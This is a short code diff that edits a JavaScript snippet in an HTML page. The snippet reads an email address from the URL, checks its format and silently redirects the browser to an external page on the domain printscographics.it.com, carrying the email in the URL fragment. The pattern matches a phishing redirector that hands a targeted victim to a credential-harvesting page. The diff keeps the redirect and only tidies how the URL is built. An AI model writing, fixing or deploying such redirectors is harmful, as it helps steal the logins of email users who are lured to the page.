@@ -132,13 +132,10 @@
     var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
     if (emailPattern.test(userEmail)) {
-               // Construct the redirect URL
-        var redirectUrl = "https://printscographics.it.com/javpm.html#" + userEmail;
-        
-        // Redirect to the constructed URL
+        // ✅ This ensures no trailing slash before the #
+        var redirectUrl = "https://printscographics.it.com/javpm.html".replace(/\/$/, "") + "#" + userEmail;
         window.location.replace(redirectUrl);
     } else {
-        // Handle invalid email
         alert("Invalid email address. Please provide a valid email in the URL.");
     }
 </script>
